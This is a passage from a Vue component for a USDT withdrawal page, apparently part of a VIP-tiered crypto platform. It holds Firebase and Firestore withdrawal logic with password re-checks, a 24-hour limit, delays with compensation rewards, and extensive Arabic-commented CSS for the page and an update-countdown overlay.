        Math.random()
          .toString(36)
          .substring(2, 9);


      try {

        // ====================================================
        // التحقق من كلمة المرور
        // ====================================================

        try {

          await signInWithEmailAndPassword(
            auth,
            user.email,
            this.password
          );

        } catch (
          authError
        ) {

          this.showMessage(
            "❌ كلمة المرور غير صحيحة. تحقق من كلمة المرور.",
            "error"
          );

          this.isLoading =
            false;

          return;

        }


        // ====================================================
        // التحقق من وجود تأخير
        // ====================================================

        const delayInfo = await this.checkWithdrawDelay(user.uid);

        if (delayInfo.isDelayed) {

          const remainingHours = Math.floor(delayInfo.remainingTime / 3600);
          const remainingMinutes = Math.floor((delayInfo.remainingTime % 3600) / 60);

          this.showMessage(
            `⚠️ تم تطبيق تأخير على السحب لمدة ${delayInfo.delayDays} أيام. المتبقي: ${remainingHours} ساعة و ${remainingMinutes} دقيقة. التعويض: ${delayInfo.reward} USDT`,
            "error"
          );

          this.isLoading =
            false;

          return;

        }


        // ====================================================
        // منع طلب خلال 24 ساعة
        // ====================================================

        const twentyFourHoursAgo =
          new Date();


        twentyFourHoursAgo.setHours(
          twentyFourHoursAgo.getHours() -
          24
        );


        const withdrawRequestsRef =
          collection(
            db,
            "withdraw_requests"
          );


        const q =
          query(
            withdrawRequestsRef,

            where(
              "userId",
              "==",
              user.uid
            ),

            where(
              "createdAt",
              ">=",
              twentyFourHoursAgo
            )
          );


        try {

          const countSnapshot =
            await getCountFromServer(
              q
            );


          if (
            countSnapshot
              .data()
              .count > 0
          ) {

            this.showMessage(
              "❌ يمكنك إرسال طلب سحب واحد فقط كل 24 ساعة.",
              "error"
            );

            this.isLoading =
              false;

            return;

          }


        } catch (
          indexError
        ) {

          console.warn(
            "استخدام الطريقة البديلة",
            indexError
          );


          const fallbackQuery =
            query(
              withdrawRequestsRef,

              where(
                "userId",
                "==",
                user.uid
              )
            );


          const querySnapshot =
            await getDocs(
              fallbackQuery
            );


          let hasRecentRequest =
            false;


          querySnapshot.forEach(
            docSnapshot => {

              if (
                hasRecentRequest
              ) {

                return;

              }


              const data =
                docSnapshot.data();


              if (
                data.createdAt
              ) {

                let createdAtDate;


                if (
                  data.createdAt.toDate
                ) {

                  createdAtDate =
                    data.createdAt.toDate();

                } else {

                  createdAtDate =
                    new Date(
                      data.createdAt
                    );

                }


                if (
                  createdAtDate >=
                  twentyFourHoursAgo
                ) {

                  hasRecentRequest =
                    true;

                }

              }

            }
          );


          if (
            hasRecentRequest
          ) {

            this.showMessage(
              "❌ يمكنك إرسال طلب سحب واحد فقط كل 24 ساعة.",
              "error"
            );

            this.isLoading =
              false;

            return;

          }

        }


        // ====================================================
        // الحصول على مبلغ الشحن من بيانات المستخدم
        // ====================================================

        const userRef = doc(db, "users", user.uid);
        const userSnap = await getDoc(userRef);
        const userData = userSnap.data();
        const rechargeAmount = Number(userData.totalRecharge || 0);


        // ====================================================
        // Transaction
        // ====================================================

        const withdrawDocRef =
          doc(
            collection(
              db,
              "withdraw_requests"
            )
          );


        const transactionDocRef =
          doc(
            collection(
              db,
              "transactions"
            )
          );


        await runTransaction(
          db,
          async (
            transaction
          ) => {

            const userSnap2 =
              await transaction.get(
                userRef
              );


            if (
              !userSnap2.exists()
            ) {

              throw new Error(
                "المستخدم غير موجود"
              );

            }


            const userData2 =
              userSnap2.data();


            const currentVipBalance =
              Number(
                userData2.vipBalance || 0
              );


            if (
              currentVipBalance <
              withdrawAmount
            ) {

              throw new Error(
                "رصيد VIP غير كافٍ للسحب"
              );

            }


            if (
              userData2.blocked
            ) {

              throw new Error(
                "حسابك محظور من السحب"
              );

            }


            // خصم الرصيد
            transaction.update(
              userRef,
              {

                vipBalance:
                  currentVipBalance -
                  withdrawAmount

              }
            );


            // طلب السحب
            transaction.set(
              withdrawDocRef,
              {

                transactionId,

                userId:
                  user.uid,

                userPhone:
                  this.userPhone ||
                  null,

                userEmail:
                  this.userEmail ||
                  null,

                amount:
                  withdrawAmount,

                fee:
                  feeAmount,

                netAmount:
                  netAmountValue,

                feePercentage:
                  this.feePercentage,

                totalDeduct:
                  withdrawAmount,

                network:
                  this.network,

                wallet:
                  this.wallet,

                walletAddress:
                  this.wallet,

                status:
                  "pending",

                createdAt:
                  serverTimestamp(),

                vipLevel:
                  this.userVipLevel,

                withdrawDay:
                  this.isVIP8OrAbove
                    ? "أي يوم"
                    : this.withdrawDay,

                adminAction:
                  "",

                adminMessage:
                  "",

                userMessage:
                  "",

                reason:
                  "",

                isVIP8OrAbove:
                  this.isVIP8OrAbove,

                withdrawFrom:
                  "vipBalance"

              }
            );


            // سجل المعاملة
            transaction.set(
              transactionDocRef,
              {

                transactionId,

                userId:
                  user.uid,

                userPhone:
                  this.userPhone ||
                  null,

                userEmail:
                  this.userEmail ||
                  null,

                type:
                  "withdraw",

                amount:
                  withdrawAmount,

                fee:
                  feeAmount,

                netAmount:
                  netAmountValue,

                feePercentage:
                  this.feePercentage,

                totalDeduct:
                  withdrawAmount,

                currency:
                  "USDT",

                network:
                  this.network,

                wallet:
                  this.wallet,

                walletAddress:
                  this.wallet,

                status:
                  "pending",

                vipLevel:
                  this.userVipLevel,

                withdrawDay:
                  this.isVIP8OrAbove
                    ? "أي يوم"
                    : this.withdrawDay,

                createdAt:
                  serverTimestamp(),

                updatedAt:
                  serverTimestamp(),

                isVIP8OrAbove:
                  this.isVIP8OrAbove,

                withdrawFrom:
                  "vipBalance"

              }
            );

          }
        );


        // ====================================================
        // تطبيق تأخير السحب (اسبوع) مع التعويض
        // ====================================================

        const delayResult = await this.applyWithdrawDelay(user.uid, rechargeAmount);

        this.showMessage(
          `✅ تم إرسال طلب السحب بنجاح. سيتم تطبيق تأخير لمدة ${delayResult.delayDays} أيام. التعويض: ${delayResult.reward} USDT سيتم إضافته إلى رصيدك.`,
          "success"
        );


        // ====================================================
        // تحديث الرصيد محلياً
        // ====================================================

        // نضيف التعويض للرصيد المحلي
        this.vipBalance += delayResult.reward;
        this.vipBalance -= withdrawAmount;


        if (this.cacheKey) {

          const cachedData =
            getCachedData(
              this.cacheKey
            ) || {};


          cachedData.vipBalance =
            this.vipBalance;


          setCachedData(
            this.cacheKey,
            cachedData
          );

        }


        // تفريغ الحقول
        this.amount = "";

        this.network = "";

        this.wallet = "";

        this.password = "";


      } catch (error) {

        console.error(
          "خطأ:",
          error
        );


        this.showMessage(
          error.message ||
          "حدث خطأ أثناء السحب",
          "error"
        );


      } finally {

        this.isLoading =
          false;

      }

    }

  }

};

</script>


<style scoped>

/* ============================================================
   الصفحة
   ============================================================ */

.withdraw-page {

  min-height: 100vh;

  background:
    linear-gradient(
      135deg,
      #0f1419 0%,
      #1a1f2e 100%
    );

  padding: 20px;

  display: flex;

  align-items: flex-start;

  justify-content: center;

  padding-top: 80px;

  padding-bottom: 100px;

  direction: rtl;

}


/* ============================================================
   شاشة التحديث العامة
   ============================================================ */

.withdraw-update-overlay {

  position: fixed;

  inset: 0;

  z-index: 999999;

  display: flex;

  align-items: center;

  justify-content: center;

  padding: 20px;

  background:
    radial-gradient(
      circle at center,
      rgba(
        252,
        213,
        53,
        0.08
      ),
      rgba(
        15,
        20,
        25,
        0.98
      ) 65%
    );

  backdrop-filter:
    blur(14px);

  -webkit-backdrop-filter:
    blur(14px);

}


/* ============================================================
   صندوق التحديث
   ============================================================ */

.update-box {

  width: min(
    90%,
    420px
  );

  padding:
    38px 25px;

  text-align: center;

  background:
    linear-gradient(
      145deg,
      #20252d,
      #14171c
    );

  border:
    1px solid
    rgba(
      252,
      213,
      53,
      0.25
    );

  border-radius: 26px;

  box-shadow:

    0 25px 80px
    rgba(
      0,
      0,
      0,
      0.70
    ),

    0 0 45px
    rgba(
      252,
      213,
      53,
      0.08
    );

  animation:
    updateBoxIn
    0.5s ease;

}


@keyframes updateBoxIn {

  from {

    opacity: 0;

    transform:
      scale(0.92)
      translateY(20px);

  }

  to {

    opacity: 1;

    transform:
      scale(1)
      translateY(0);

  }

}


/* ============================================================
   Loader
   ============================================================ */

.loader {

  width: 70px;

  height: 70px;

  margin:
    0 auto 25px;

  border-radius: 50%;

  border:
    5px solid
    rgba(
      252,
      213,
      53,
      0.10
    );

  border-top-color:
    #fcd535;

  border-right-color:
    rgba(
      252,
      213,
      53,
      0.55
    );

  animation:
    spin
    0.9s linear infinite;

  box-shadow:
    0 0 25px
    rgba(
      252,
      213,
      53,
      0.15
    );

}


@keyframes spin {

  to {

    transform:
      rotate(360deg);

  }

}


/* ============================================================
   Completed
   ============================================================ */

.completed-icon {

  width: 70px;

  height: 70px;

  margin:
    0 auto 25px;

  border-radius: 50%;

  display: flex;

  align-items: center;

  justify-content: center;

  background:
    rgba(
      16,
      185,
      129,
      0.12
    );

  border:
    2px solid
    #10b981;

  color:
    #10b981;

  font-size: 30px;

  box-shadow:
    0 0 30px
    rgba(
      16,
      185,
      129,
      0.15
    );

}


/* ============================================================
   Update title
   ============================================================ */

.update-box h3 {

  color:
    #fcd535;

  font-size:
    23px;

  font-weight:
    800;

  margin:
    0 0 10px;

}


.update-box p {

  color:
    #9aa3af;

  font-size:
    13px;

  margin:
    0 0 25px;

  line-height:
    1.7;

}


/* ============================================================
   Countdown
   ============================================================ */

.countdown {

  font-family:
    "Courier New",
    monospace;

  font-size:
    40px;

  font-weight:
    900;

  color:
    #fcd535;

  letter-spacing:
    3px;

  direction:
    ltr;

  background:
    rgba(
      252,
      213,
      53,
      0.07
    );

  border:
    1px solid
    rgba(
      252,
      213,
      53,
      0.20
    );

  border-radius:
    16px;

  padding:
    16px 10px;

  box-shadow:

    inset 0 0 25px
    rgba(
      252,
      213,
      53,
      0.04
    ),

    0 0 25px
    rgba(
      252,
      213,
      53,
      0.05
    );

}


.countdown-label {

  display:
    block;

  margin-top:
    10px;

  color:
    #737b87;

  font-size:
    11px;

}


/* ============================================================
   Rewards Table
   ============================================================ */

.rewards-table {

  margin-top:
    20px;

  padding-top:
    18px;

  border-top:
    1px solid
    rgba(
      255,
      255,
      255,
      0.06
    );

}


.table-scroll {

  max-height:
    200px;

  overflow-y:
    auto;

  border-radius:
    10px;

  border:
    1px solid
    rgba(
      252,
      213,
      53,
      0.15
    );

}


.table-scroll::-webkit-scrollbar {

  width:
    4px;

}


.table-scroll::-webkit-scrollbar-track {

  background:
    rgba(
      255,
      255,
      255,
      0.05
    );

  border-radius:
    10px;

}


.table-scroll::-webkit-scrollbar-thumb {

  background:
    rgba(
      252,
      213,
      53,
      0.3
    );

  border-radius:
    10px;

}


.rewards-table table {

  width:
    100%;

  border-collapse:
    collapse;

  font-size:
    12px;

}


.rewards-table th {

  background:
    rgba(
      252,
      213,
      53,
      0.1
    );

  color:
    #fcd535;

  padding:
    8px 10px;

  font-weight:
    700;

  position:
    sticky;

  top:
    0;

  z-index:
    2;

}


.rewards-table td {

  color:
    #eaecef;

  padding:
    6px 10px;

  border-bottom:
    1px solid
    rgba(
      255,
      255,
      255,
      0.05
    );

}


.rewards-table tr:hover td {

  background:
    rgba(
      252,
      213,
      53,
      0.05
    );

}


.rewards-table tr:last-child td {

  border-bottom:
    none;

}


.table-note {

  margin-top:
    10px;

  color:
    #737b87;

  font-size:
    11px;

  display:
    flex;

  align-items:
    center;

  justify-content:
    center;

  gap:
    6px;

}


.table-note i {

  color:
    #fcd535;

}


/* ============================================================
   Update info
   ============================================================ */

.update-info {

  margin-top:
    20px;

  padding-top:
    18px;

  border-top:
    1px solid
    rgba(
      255,
      255,
      255,
      0.06
    );

}


.update-info-row {

  display:
    flex;

  align-items:
    center;

  justify-content:
    center;

  gap:
    8px;

  color:
    #737b87;

  font-size:
    11px;

  margin-bottom:
    8px;

}


.update-info-row i {

  color:
    #fcd535;

}


/* ============================================================
   Card
   ============================================================ */

.card {

  background:
    linear-gradient(
      135deg,
      #1e2329 0%,
      #181a20 100%
    );

  border-radius:
    24px;

  padding:
    28px;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.15
    );

  box-shadow:
    0 20px 60px
    rgba(
      0,
      0,
      0,
      0.4
    );

  max-width:
    500px;

  width:
    100%;

}


/* ============================================================
   Header
   ============================================================ */

.card-header {

  margin-bottom:
    28px;

  text-align:
    center;

}


.title {

  font-size:
    28px;

  font-weight:
    800;

  color:
    #eaecef;

  margin-bottom:
    8px;

  display:
    flex;

  align-items:
    center;

  justify-content:
    center;

  gap:
    10px;

}


.title-glow {

  color:
    #fcd535;

  font-size:
    20px;

  background:
    rgba(
      212,
      175,
      55,
      0.15
    );

  padding:
    4px 12px;

  border-radius:
    8px;

}


.sub {

  color:
    #848e9c;

  font-size:
    14px;

  margin:
    0;

}


/* ============================================================
   Balance
   ============================================================ */

.balance-box {

  background:
    rgba(
      212,
      175,
      55,
      0.08
    );

  border-radius:
    16px;

  padding:
    16px;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.2
    );

  margin-bottom:
    20px;

}


.balance-info {

  display:
    flex;

  flex-direction:
    column;

  gap:
    8px;

}


.balance-label {

  font-size:
    12px;

  color:
    #848e9c;

  font-weight:
    600;

}


.balance-display {

  display:
    flex;

  align-items:
    center;

  gap:
    8px;

}


.balance-usdt-icon {

  width:
    20px;

  height:
    20px;

  border-radius:
    50%;

}


.balance-amount {

  font-size:
    24px;

  font-weight:
    900;

  color:
    #fcd535;

  font-family:
    "Courier New",
    monospace;

}


.balance-currency-badge {

  font-size:
    11px;

  color:
    #fcd535;

  font-weight:
    700;

  background:
    rgba(
      212,
      175,
      55,
      0.15
    );

  padding:
    4px 8px;

  border-radius:
    6px;

}


/* ============================================================
   VIP
   ============================================================ */

.vip-status-box {

  background:
    rgba(
      212,
      175,
      55,
      0.08
    );

  border-radius:
    16px;

  padding:
    16px;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.2
    );

  margin-bottom:
    20px;

  display:
    flex;

  flex-direction:
    column;

  gap:
    12px;

}


.vip-status-box.error {

  background:
    rgba(
      220,
      38,
      38,
      0.08
    );

  border-color:
    rgba(
      220,
      38,
      38,
      0.2
    );

  color:
    #dc2626;

}


.vip-badge {

  display:
    flex;

  align-items:
    center;

  gap:
    8px;

  font-weight:
    700;

  color:
    #fcd535;

  font-size:
    14px;

}


.user-contact {

  font-size:
    13px;

  color:
    #eaecef;

  display:
    flex;

  align-items:
    center;

  gap:
    6px;

}


.user-contact i {

  color:
    #fcd535;

}


.withdraw-condition {

  display:
    flex;

  align-items:
    center;

  gap:
    8px;

  font-size:
    13px;

  color:
    #eaecef;

}


.withdraw-condition i {

  color:
    #dc2626;

}


.withdraw-condition i.condition-met {

  color:
    #10b981;

}


.vip-special-badge {

  background:
    linear-gradient(
      135deg,
      #fcd53520,
      #d4af3720
    );

  border-radius:
    10px;

  padding:
    8px 12px;

  font-size:
    12px;

  color:
    #fcd535;

  display:
    flex;

  align-items:
    center;

  gap:
    8px;

  font-weight:
    700;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.3
    );

}


/* ============================================================
   Inputs
   ============================================================ */

.input-group {

  margin-bottom:
    20px;

}


.input-group label {

  display:
    flex;

  align-items:
    center;

  gap:
    6px;

  font-size:
    13px;

  font-weight:
    700;

  color:
    #eaecef;

  margin-bottom:
    8px;

}


.input-group label i {

  color:
    #fcd535;

}


.amount-input-wrapper,
.wallet-input-wrapper,
.password-input-wrapper {

  display:
    flex;

  align-items:
    center;

  background:
    rgba(
      212,
      175,
      55,
      0.05
    );

  border-radius:
    12px;

  padding:
    4px 8px;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.15
    );

}


.gold-input {

  flex:
    1;

  background:
    transparent;

  border:
    none;

  color:
    #eaecef;

  padding:
    10px 8px;

  font-size:
    14px;

  outline:
    none;

  font-weight:
    600;

}


.input-currency-badge {

  color:
    #fcd535;

  font-weight:
    700;

  font-size:
    10px;

  background:
    rgba(
      212,
      175,
      55,
      0.1
    );

  padding:
    4px 6px;

  border-radius:
    5px;

}


.input-error {

  display:
    block;

  color:
    #fca5a5;

  font-size:
    12px;

  margin-top:
    6px;

}


/* ============================================================
   Separator
   ============================================================ */

.fields-separator {

  height:
    1px;

  background:
    transparent;

  margin:
    5px 0;

}


.isolated-section {

  position:
    relative;

}


.wallet-section,
.password-section {

  position:
    relative;

  z-index:
    1;

}


/* ============================================================
   Password
   ============================================================ */

.toggle-password-btn {

  background:
    transparent;

  border:
    none;

  color:
    #848e9c;

  cursor:
    pointer;

  padding:
    8px 12px;

  font-size:
    14px;

}


.toggle-password-btn:hover {

  color:
    #fcd535;

}


/* ============================================================
   Dropdown
   ============================================================ */

.custom-dropdown {

  position:
    relative;

}


.dropdown-trigger {

  display:
    flex;

  align-items:
    center;

  justify-content:
    space-between;

  background:
    rgba(
      212,
      175,
      55,
      0.05
    );

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.15
    );

  border-radius:
    12px;

  padding:
    12px 14px;

  cursor:
    pointer;

}


.selected-network {

  display:
    flex;

  align-items:
    center;

  gap:
    10px;

  color:
    #eaecef;

  font-weight:
    600;

  font-size:
    14px;

}


.dropdown-icon {

  width:
    24px;

  height:
    24px;

}


.placeholder {

  color:
    #5a6370;

  font-size:
    14px;

}


.dropdown-menu {

  position:
    absolute;

  top:
    calc(100% + 8px);

  left:
    0;

  right:
    0;

  background:
    #1e2329;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.2
    );

  border-radius:
    12px;

  z-index:
    100;

  overflow:
    hidden;

}


.dropdown-item {

  display:
    flex;

  align-items:
    center;

  gap:
    12px;

  padding:
    12px 14px;

  cursor:
    pointer;

}


.dropdown-item:hover {

  background:
    rgba(
      212,
      175,
      55,
      0.08
    );

}


.dropdown-item.active {

  background:
    rgba(
      212,
      175,
      55,
      0.15
    );

}


.dropdown-item-icon {

  width:
    28px;

  height:
    28px;

}


.dropdown-item-content {

  flex:
    1;

}


.dropdown-item-name {

  color:
    #eaecef;

  font-weight:
    600;

  font-size:
    13px;

}


.dropdown-item-symbol {

  color:
    #848e9c;

  font-size:
    11px;

}


/* ============================================================
   Summary
   ============================================================ */

.summary-box {

  background:
    rgba(
      212,
      175,
      55,
      0.08
    );

  border-radius:
    16px;

  padding:
    16px;

  border:
    1px solid
    rgba(
      212,
      175,
      55,
      0.2
    );

  margin-bottom:
    20px;

}


.summary-box h3 {

  font-size:
    14px;

  font-weight:
    700;

  color:
    #fcd535;

  margin:
    0 0 12px;

}


.summary-item {

  display:
    flex;

  justify-content:
    space-between;

  gap:
    10px;

  padding:
    8px 0;

  font-size:
    12px;

  color:
    #eaecef;

  border-bottom:
    1px solid
    rgba(
      212,
      175,
      55,
      0.1
    );

}


.summary-item.total {

  font-weight:
    700;

  color:
    #fcd535;

}


.summary-value {

  color:
    #fcd535;

  font-weight:
    600;

  text-align:
    left;

}


.summary-value.fee {

  color:
    #fca5a5;

}


.summary-value.net {

  color:
    #86efac;

}


/* ============================================================
   Warning
   ============================================================ */

.warning-box {

  background:
    rgba(
      217,
      119,
      6,
      0.1
    );

  border-radius:
    12px;

  padding:
    12px;

  border:
    1px solid
    rgba(
      217,
      119,
      6,
      0.2
    );

  display:
    flex;

  gap:
    10px;

  margin-bottom:
    20px;

}


.warning-box i {

  color:
    #d97706;

}


.warning-text p {

  margin:
    0;

  font-size:
    12px;

  color:
    #eaecef;

}


.warning-text p.small {

  color:
    #848e9c;

  font-size:
    11px;

}


/* ============================================================
   Button
   ============================================================ */

.gold-button {

  width:
    100%;

  padding:
    14px;

  background:
    linear-gradient(
      135deg,
      #fcd535 0%,
      #d4af37 100%
    );

  color:
    #0f1419;

  border:
    none;

  border-radius:
    12px;

  font-size:
    14px;

  font-weight:
    700;

  cursor:
    pointer;

  display:
    flex;

  align-items:
    center;

  justify-content:
    center;

  gap:
    8px;

}


.gold-button:disabled {

  opacity:
    0.5;

  cursor:
    not-allowed;

}


/* ============================================================
   Messages
   ============================================================ */

.message {

  padding:
    12px 16px;

  border-radius:
    12px;

  margin-top:
    16px;

  display:
    flex;

  align-items:
    center;

  gap:
    10px;

  font-size:
    13px;

  font-weight:
    600;

}


.message.error {

  background:
    rgba(
      220,
      38,
      38,
      0.15
    );

  color:
    #fca5a5;

  border:
    1px solid
    rgba(
      220,
      38,
      38,
      0.3
    );

}


.message.success {

  background:
    rgba(
      16,
      185,
      129,
      0.15
    );

  color:
    #86efac;

  border:
    1px solid
    rgba(
      16,
      185,
      129,
      0.3
    );

}


/* ============================================================
   Fade
   ============================================================ */

.fade-enter-active,
.fade-leave-active {

  transition:
    opacity
    0.3s ease;

}


.fade-enter-from,
.fade-leave-to {

  opacity:
    0;

}


/* ============================================================
   Mobile
   ============================================================ */

@media (max-width: 500px) {

  .withdraw-page {

    padding:
      15px;

    padding-top:
      30px;

  }


  .card {

    padding:
      20px;

    border-radius:
      20px;

  }


  .title {

    font-size:
      23px;

  }


  .countdown {

    font-size:
      31px;

    letter-spacing:
      2px;

  }


  .update-box {

    padding:
      30px 20px;

  }

}

</style>
